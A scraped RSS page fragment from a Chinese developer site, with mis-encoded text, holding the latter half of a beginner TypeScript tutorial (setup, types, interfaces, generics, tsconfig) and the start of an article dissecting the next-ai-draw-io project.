<li><strong>å¼±ç±»å‹é™·é˜±</strong>ï¼šJS åœ¨è¿è¡Œæ—¶æ‰æŠ¥é”™ï¼ˆå¦‚ <code>"5" + 3 = "53"</code>ï¼‰ï¼ŒTS åœ¨<strong>ç¼–ç é˜¶æ®µå°±æ‹¦æˆªé”™è¯¯</strong>ã€‚</li>
<li><strong>ç»´æŠ¤å›°éš¾</strong>ï¼šå¤§å‹é¡¹ç›®ä¸­å˜é‡/å‡½æ•°ç”¨é€”æ¨¡ç³Šï¼ŒTS é€šè¿‡ç±»å‹æ³¨è§£è®©ä»£ç <strong>è‡ªè§£é‡Šã€æ˜“åä½œ</strong>ã€‚</li>
<li><strong>IDE ä½“éªŒå·®</strong>ï¼šJS ç¼ºä¹ç²¾å‡†æç¤ºï¼ŒTS è®© VS Code å®ç°<strong>æ™ºèƒ½è¡¥å…¨ã€è·³è½¬ã€é‡æ„</strong>ã€‚</li>
</ul>
<h4 data-id="heading-3">âœ… 2. è¡Œä¸šç°çŠ¶ï¼ˆ2026ï¼‰</h4>
<ul>
<li><strong>ä¸»æµæ¡†æ¶å…¨é¢æ‹¥æŠ± TS</strong>ï¼šVue 3ã€React 18+ã€Angularã€NestJS é»˜è®¤ä½¿ç”¨ TSã€‚</li>
<li><strong>æ‹›è˜ç¡¬æ€§è¦æ±‚</strong>ï¼š90% ä»¥ä¸Šä¸­é«˜çº§å‰ç«¯å²—ä½æ˜ç¡®è¦æ±‚ â€œç†Ÿç»ƒä½¿ç”¨ TypeScriptâ€ã€‚</li>
<li><strong>å¼€æºç”Ÿæ€æ”¯æŒå®Œå–„</strong>ï¼šå‡ ä¹æ‰€æœ‰ npm åŒ…éƒ½æä¾› <code>@types/xxx</code> ç±»å‹å£°æ˜ã€‚</li>
</ul>
<blockquote>
<p>ğŸ’¡ <strong>å­¦ä¹ å»ºè®®</strong>ï¼šå…ˆæŒæ¡ JS åŸºç¡€ï¼Œå†å­¦ TSâ€”â€”å› ä¸º TS æ˜¯ JS çš„è¶…é›†ï¼</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">äºŒã€å¿«é€Ÿæ­å»ºå¼€å‘ç¯å¢ƒï¼ˆ2026 æ¨èæ–¹å¼ï¼‰</h3>
<h4 data-id="heading-5">1. å…¨å±€å®‰è£… TypeScript</h4>
<pre><code class="hljs language-perl" lang="perl">npm install -g typescript@5.<span class="hljs-number">7</span>  <span class="hljs-comment"># 2026 å¹´ä¸»æµç‰ˆæœ¬ä¸º TS 5.x</span>
</code></pre>
<h4 data-id="heading-6">2. åˆå§‹åŒ–é¡¹ç›®</h4>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-keyword">mkdir</span> <span class="hljs-keyword">my</span>-ts-app &amp;&amp; cd <span class="hljs-keyword">my</span>-ts-app
npm init -<span class="hljs-keyword">y</span>
tsc --init  <span class="hljs-comment"># ç”Ÿæˆ tsconfig.json</span>
</code></pre>
<h4 data-id="heading-7">3. å¼€å‘å·¥å…·æ¨è</h4>
<ul>
<li>
<p><strong>ç¼–è¾‘å™¨</strong>ï¼šVS Codeï¼ˆå†…ç½® TS æ”¯æŒæœ€ä½³ï¼‰</p>
</li>
<li>
<p><strong>æ’ä»¶</strong>ï¼š<code>Code Runner</code>ï¼ˆä¸€é”®è¿è¡Œ <code>.ts</code> æ–‡ä»¶ï¼‰</p>
</li>
<li>
<p><strong>è°ƒè¯•</strong>ï¼šé…åˆ <code>ts-node</code> ç›´æ¥æ‰§è¡Œ TSï¼ˆæ— éœ€æ‰‹åŠ¨ç¼–è¯‘ï¼‰ï¼š</p>
<pre><code class="hljs">npm install -D ts-node
npx ts-node index.ts
</code></pre>
</li>
</ul>
<hr/>
<h3 data-id="heading-8">ä¸‰ã€æ ¸å¿ƒè¯­æ³•è¯¦è§£ï¼ˆé™„ä»£ç ç¤ºä¾‹ï¼‰</h3>
<h4 data-id="heading-9">ğŸ”¹ 1. ç±»å‹æ³¨è§£ï¼ˆType Annotationï¼‰</h4>
<pre><code class="hljs language-ini" lang="ini">let age: <span class="hljs-attr">number</span> = <span class="hljs-number">25</span><span class="hljs-comment">;</span>
let name: <span class="hljs-attr">string</span> = <span class="hljs-string">"Alice"</span><span class="hljs-comment">;</span>
let isActive: <span class="hljs-attr">boolean</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
let hobbies: string<span class="hljs-section">[]</span> = <span class="hljs-section">["coding", "reading"]</span><span class="hljs-comment">;</span>
let tuple: <span class="hljs-section">[string, number]</span> = <span class="hljs-section">["Bob", 30]</span><span class="hljs-comment">; // å…ƒç»„</span>
</code></pre>
<blockquote>
<p>âš ï¸ æ³¨æ„ï¼šä¸€æ—¦æŒ‡å®šç±»å‹ï¼Œå°±ä¸èƒ½èµ‹å€¼å…¶ä»–ç±»å‹ï¼ˆé™¤éæ˜¯å­ç±»å‹æˆ–è”åˆç±»å‹ï¼‰ã€‚</p>
</blockquote>
<hr/>
<h4 data-id="heading-10">ğŸ”¹ 2. ç±»å‹æ¨æ–­ï¼ˆType Inferenceï¼‰â€”â€” èƒ½çœåˆ™çœï¼</h4>
<pre><code class="hljs language-ini" lang="ini">let <span class="hljs-attr">price</span> = <span class="hljs-number">99.9</span><span class="hljs-comment">;     // TS è‡ªåŠ¨æ¨æ–­ä¸º number</span>
let <span class="hljs-attr">title</span> = <span class="hljs-string">"Hello"</span><span class="hljs-comment">;  // è‡ªåŠ¨æ¨æ–­ä¸º string</span>
// <span class="hljs-attr">price</span> = <span class="hljs-string">"free"</span><span class="hljs-comment">;    // âŒ æŠ¥é”™ï¼ç±»å‹å·²å›ºå®š</span>
</code></pre>
<blockquote>
<p>âœ… <strong>æœ€ä½³å®è·µ</strong>ï¼šåˆå§‹åŒ–æ—¶èµ‹å€¼ â†’ çœç•¥ç±»å‹æ³¨è§£ï¼›å»¶è¿Ÿèµ‹å€¼ â†’ å¿…é¡»æ˜¾å¼å£°æ˜ç±»å‹ã€‚</p>
</blockquote>
<hr/>
<h4 data-id="heading-11">ğŸ”¹ 3. è”åˆç±»å‹ &amp; å­—é¢é‡ç±»å‹</h4>
<pre><code class="hljs language-ini" lang="ini">let status: "loading" | "success" | <span class="hljs-attr">"error"</span> = <span class="hljs-string">"loading"</span><span class="hljs-comment">;</span>
let id: string | <span class="hljs-attr">number</span> = <span class="hljs-string">"user_123"</span><span class="hljs-comment">;</span>
<span class="hljs-attr">id</span> = <span class="hljs-number">456</span><span class="hljs-comment">; // âœ… åˆæ³•</span>
</code></pre>
<hr/>
<h4 data-id="heading-12">ğŸ”¹ 4. æ¥å£ï¼ˆinterfaceï¼‰ vs ç±»å‹åˆ«åï¼ˆtypeï¼‰</h4>

























<table><thead><tr><th>ç‰¹æ€§</th><th><code>interface</code></th><th><code>type</code></th></tr></thead><tbody><tr><td>å¯åˆå¹¶å£°æ˜</td><td>âœ…</td><td>âŒ</td></tr><tr><td>æ”¯æŒ extends/implements</td><td>âœ…</td><td>âŒï¼ˆä½†å¯ç”¨äº¤å‰ç±»å‹ <code>&amp;</code> æ¨¡æ‹Ÿï¼‰</td></tr><tr><td>å¯å®šä¹‰åŸå§‹ç±»å‹/è”åˆç±»å‹</td><td>âŒ</td><td>âœ…</td></tr></tbody></table>
<p><strong>æ¨èç”¨æ³•</strong>ï¼š</p>
<ul>
<li>å¯¹è±¡ç»“æ„ â†’ ä¼˜å…ˆç”¨ <code>interface</code></li>
<li>è”åˆç±»å‹/å…ƒç»„/å·¥å…·ç±»å‹ â†’ ç”¨ <code>type</code></li>
</ul>
<pre><code class="hljs language-ini" lang="ini">interface User {
  name: string<span class="hljs-comment">;</span>
  age: number<span class="hljs-comment">;</span>
}

type <span class="hljs-attr">ID</span> = string | number<span class="hljs-comment">;</span>
type <span class="hljs-attr">Status</span> = <span class="hljs-string">"active"</span> | <span class="hljs-string">"inactive"</span><span class="hljs-comment">;</span>
</code></pre>
<hr/>
<h4 data-id="heading-13">ğŸ”¹ 5. å‡½æ•°ç±»å‹</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ–¹å¼1ï¼šå‚æ•°+è¿”å›å€¼æ³¨è§£</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">string</span> {
  <span class="hljs-keyword">return</span> <span class="hljs-string">`Hello, <span class="hljs-subst">${name}</span>!`</span>;
}

<span class="hljs-comment">// æ–¹å¼2ï¼šå‡½æ•°ç±»å‹åˆ«å</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">AddFn</span> = <span class="hljs-function">(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">number</span>;
<span class="hljs-keyword">const</span> <span class="hljs-attr">add</span>: <span class="hljs-title class_">AddFn</span> = <span class="hljs-function">(<span class="hljs-params">x, y</span>) =&gt;</span> x + y;

<span class="hljs-comment">// å¯é€‰å‚æ•° &amp; é»˜è®¤å‚æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createUser</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age?: <span class="hljs-built_in">number</span>, role = <span class="hljs-string">"user"</span></span>) {
  <span class="hljs-comment">// ...</span>
}
</code></pre>
<hr/>
<h4 data-id="heading-14">ğŸ”¹ 6. ç±»ï¼ˆClassï¼‰ä¸è®¿é—®ä¿®é¥°ç¬¦</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
  <span class="hljs-keyword">protected</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }
  <span class="hljs-title function_">move</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> is moving`</span>); }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> {
  <span class="hljs-title function_">bark</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> barks!`</span>); <span class="hljs-comment">// âœ… protected å…è®¸å­ç±»è®¿é—®</span>
  }
}
</code></pre>
<ul>
<li><code>public</code>ï¼ˆé»˜è®¤ï¼‰ï¼šä»»ä½•åœ°æ–¹å¯è®¿é—®</li>
<li><code>private</code>ï¼šä»…ç±»å†…éƒ¨</li>
<li><code>protected</code>ï¼šç±»åŠå…¶å­ç±»</li>
</ul>
<hr/>
<h4 data-id="heading-15">ğŸ”¹ 7. æ³›å‹ï¼ˆGenericsï¼‰â€”â€” å†™é«˜å¤ç”¨ç»„ä»¶çš„å…³é”®</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function">function <span class="hljs-title">identity</span>&lt;<span class="hljs-title">T</span>&gt;(<span class="hljs-params">arg: T</span>): T</span> {
  <span class="hljs-keyword">return</span> arg;
}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-keyword">let</span> output = identity&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">"hello"</span>);
<span class="hljs-keyword">let</span> nums = identity&lt;number[]&gt;([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]);
</code></pre>
<blockquote>
<p>ğŸ’¡ æ³›å‹å¸¸ç”¨äºï¼šæ•°ç»„æ“ä½œã€API è¯·æ±‚å°è£…ã€çŠ¶æ€ç®¡ç†ç­‰ã€‚</p>
</blockquote>
<hr/>
<h4 data-id="heading-16">ğŸ”¹ 8. å†…ç½®å·¥å…·ç±»å‹ï¼ˆUtility Typesï¼‰</h4>
<p>TS å†…ç½®äº†å¤šä¸ªå®ç”¨ç±»å‹ï¼Œæå‡å¼€å‘æ•ˆç‡ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">interface Todo {
  title: string<span class="hljs-comment">;</span>
  completed: boolean<span class="hljs-comment">;</span>
}

// Partial&lt;T&gt;ï¼šæ‰€æœ‰å±æ€§å˜ä¸ºå¯é€‰
type <span class="hljs-attr">PartialTodo</span> = Partial&lt;Todo&gt;<span class="hljs-comment">;</span>

// Readonly&lt;T&gt;ï¼šæ‰€æœ‰å±æ€§åªè¯»
const todo: Readonly&lt;Todo&gt; = { title: "Learn TS", completed: false }<span class="hljs-comment">;</span>
// <span class="hljs-attr">todo.title</span> = <span class="hljs-string">"new"</span><span class="hljs-comment">; // âŒ æŠ¥é”™</span>

// Pick&lt;T, K&gt;ï¼šé€‰å–éƒ¨åˆ†å±æ€§
type <span class="hljs-attr">TodoPreview</span> = Pick&lt;Todo, <span class="hljs-string">"title"</span>&gt;<span class="hljs-comment">;</span>
</code></pre>
<hr/>
<h3 data-id="heading-17">å››ã€é…ç½®æ–‡ä»¶ <code>tsconfig.json</code> æ ¸å¿ƒé€‰é¡¹ï¼ˆ2026 æ¨èé…ç½®ï¼‰</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"compilerOptions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"target"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ES2022"</span><span class="hljs-punctuation">,</span>          <span class="hljs-comment">// ç¼–è¯‘ç›®æ ‡ JS ç‰ˆæœ¬</span>
    <span class="hljs-attr">"module"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"NodeNext"</span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// æ¨¡å—ç³»ç»Ÿï¼ˆå…¼å®¹ Node.js ESMï¼‰</span>
    <span class="hljs-attr">"strict"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>              <span class="hljs-comment">// å¯ç”¨æ‰€æœ‰ä¸¥æ ¼ç±»å‹æ£€æŸ¥</span>
    <span class="hljs-attr">"esModuleInterop"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>     <span class="hljs-comment">// å…¼å®¹ CommonJS ä¸ ESM</span>
    <span class="hljs-attr">"skipLibCheck"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// è·³è¿‡ .d.ts ç±»å‹æ£€æŸ¥ï¼ˆåŠ é€Ÿç¼–è¯‘ï¼‰</span>
    <span class="hljs-attr">"outDir"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./dist"</span><span class="hljs-punctuation">,</span>          <span class="hljs-comment">// è¾“å‡ºç›®å½•</span>
    <span class="hljs-attr">"rootDir"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./src"</span>           <span class="hljs-comment">// æºç ç›®å½•</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"include"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"src/**/*"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"exclude"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"node_modules"</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<blockquote>
<p>âœ… <strong>å»ºè®®å¼€å¯ <code>"strict": true</code></strong> â€”â€” è¿™æ˜¯ TS å‘æŒ¥æœ€å¤§ä»·å€¼çš„å…³é”®ï¼</p>
</blockquote>
<hr/>
<h3 data-id="heading-18">äº”ã€å¸¸è§é—®é¢˜ &amp; æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-19">â“ Q1ï¼šå¦‚ä½•å¤„ç†ç¬¬ä¸‰æ–¹åº“æ²¡æœ‰ç±»å‹å£°æ˜ï¼Ÿ</h4>
<pre><code class="hljs language-bash" lang="bash">npm install @types/lodash  <span class="hljs-comment"># å®‰è£…å®˜æ–¹ç±»å‹åŒ…</span>
</code></pre>
<p>è‹¥æ—  <code>@types/xxx</code>ï¼Œå¯ä¸´æ—¶ç”¨ <code>any</code> æˆ–è‡ªè¡Œå£°æ˜æ¨¡å—ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// types.d.ts</span>
<span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">"my-legacy-lib"</span>;
</code></pre>
<h4 data-id="heading-20">â“ Q2ï¼šä»€ä¹ˆæ—¶å€™ç”¨ <code>as</code> ç±»å‹æ–­è¨€ï¼Ÿ</h4>
<ul>
<li>
<p>ä»…åœ¨ä½ <strong>100% ç¡®å®šç±»å‹</strong>æ—¶ä½¿ç”¨ï¼ˆå¦‚ DOM å…ƒç´ ï¼‰ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">input</span> = document.getElementById(<span class="hljs-string">"email"</span>) as HTMLInputElement<span class="hljs-comment">;</span>
</code></pre>
</li>
<li>
<p>é¿å…æ»¥ç”¨ï¼å¦åˆ™ä¼šç»•è¿‡ç±»å‹æ£€æŸ¥ï¼Œå¤±å» TS ä¼˜åŠ¿ã€‚</p>
</li>
</ul>
<hr/>
<h3 data-id="heading-21">å…­ã€å­¦ä¹ èµ„æºæ¨èï¼ˆ2026 æ›´æ–°ï¼‰</h3>

























<table><thead><tr><th>ç±»å‹</th><th>æ¨è</th></tr></thead><tbody><tr><td>ğŸ“š ä¸­æ–‡æ–‡æ¡£</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.typescriptlang.org%2Fzh%2F" target="_blank" title="https://www.typescriptlang.org/zh/" ref="nofollow noopener noreferrer">TypeScript å®˜æ–¹ä¸­æ–‡ç«™</a></td></tr><tr><td>ğŸ“˜ å…¥é—¨æ•™ç¨‹</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fwangdoc.com%2Ftypescript%2F" target="_blank" title="https://wangdoc.com/typescript/" ref="nofollow noopener noreferrer">é˜®ä¸€å³°ã€ŠTypeScript æ•™ç¨‹ã€‹</a></td></tr><tr><td>ğŸ¥ è§†é¢‘è¯¾ç¨‹</td><td>Bilibili æœç´¢ â€œTypeScript 2026 å®æˆ˜â€</td></tr><tr><td>ğŸ’» åœ¨çº¿ç»ƒä¹ </td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.typescriptlang.org%2Fplay" target="_blank" title="https://www.typescriptlang.org/play" ref="nofollow noopener noreferrer">TS Playground</a></td></tr></tbody></table>
<hr/>
<h3 data-id="heading-22">ç»“è¯­</h3>
<blockquote>
<p><strong>TypeScript ä¸æ˜¯å¢åŠ è´Ÿæ‹…ï¼Œè€Œæ˜¯å‡å°‘æœªæ¥ 80% çš„è°ƒè¯•æ—¶é—´ã€‚</strong><br/>
2026 å¹´ï¼Œå®ƒå·²ä»å‰ç«¯â€œåŠ åˆ†é¡¹â€å˜ä¸ºâ€œå¿…å¤‡æŠ€èƒ½â€ã€‚ä»ä»Šå¤©å¼€å§‹ï¼Œç”¨ TS é‡æ„ä½ çš„ä¸‹ä¸€ä¸ªé¡¹ç›®å§ï¼</p>
</blockquote>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¼€æºé¡¹ç›®next-ai-draw-ioæ ¸å¿ƒèƒ½åŠ›æ‹†è§£]]></title>    <link>https://juejin.cn/post/7592552501579202586</link>    <guid>https://juejin.cn/post/7592552501579202586</guid>    <pubDate>2026-01-08T02:17:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592552501579202586" data-draft-id="7592559120117530670" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¼€æºé¡¹ç›®next-ai-draw-ioæ ¸å¿ƒèƒ½åŠ›æ‹†è§£"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,LLM"/> <meta itemprop="datePublished" content="2026-01-08T02:17:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="irises"/> <meta itemprop="url" content="https://juejin.cn/user/3030697436261735"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¼€æºé¡¹ç›®next-ai-draw-ioæ ¸å¿ƒèƒ½åŠ›æ‹†è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3030697436261735/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    irises
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:17:00.000Z" title="Thu Jan 08 2026 02:17:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ä¸€.é¡¹ç›®ç®€ä»‹</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c9d9468582949b4b270241cc109e083~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaXJpc2Vz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768443518&amp;x-signature=vwaDRAlBfzMfA%2F3adtbbeMXInh4%3D" alt="Pasted image 20260107160259.png" loading="lazy"/>
ä»é¡¹ç›®åç§°ä¸å›¾ä¸­å¯ä»¥å°±å¯ä»¥è½»æ¾çœ‹å‡ºè¿™æ˜¯ä¸€ä¸ªé‡ç‚¹åœ¨äº<strong>é€šè¿‡å¤§æ¨¡å‹èƒ½åŠ›æ§åˆ¶<code>draw-io</code>ç»˜åˆ¶æµç¨‹å›¾</strong>çš„é¡¹ç›®ï¼Œå·¦ä¾§ä¸ºç”»å¸ƒäº¤äº’ä¸»ä½“ï¼Œå³ä¾§ä¸º<code>AI</code>äº¤äº’çš„ä¸»ä½“ã€‚</p>
<blockquote>
<p>è¯¥é¡¹ç›®åœ°å€ï¼š[<code>github</code>](<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FDayuanJiang%2Fnext-ai-draw-io" target="_blank" title="https://github.com/DayuanJiang/next-ai-draw-io" ref="nofollow noopener noreferrer">DayuanJiang/next-ai-draw-io: A next.js web application that integrates AI capabilities with draw.io diagrams. This app allows you to create, modify, and enhance diagrams through natural language commands and AI-assisted visualization.</a>) ã€‚ç›®å‰å·²ç»è·å¾—<code>star</code>: 17Kã€‚</p>
</blockquote>
<h3 data-id="heading-1">äºŒ.æŠ€æœ¯æ‹†è§£</h3>
<h4 data-id="heading-2">1.æ•´ä½“ç®€ä»‹</h4>
<p>æ•´ä½“ä»ç»“æ„ä¸Šï¼Œè¯¥é¡¹ç›®å¯ä»¥åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š<code>next</code>ç¨‹åº + <code>draw-io Iframe</code> + <code>LLM</code>ï¼Œå¦‚ä¸‹æ˜¯ä¸€ä¸ªä»æ–°å»ºåˆ°æ›´æ–°çš„å®Œæ•´æµç¨‹ã€‚</p>
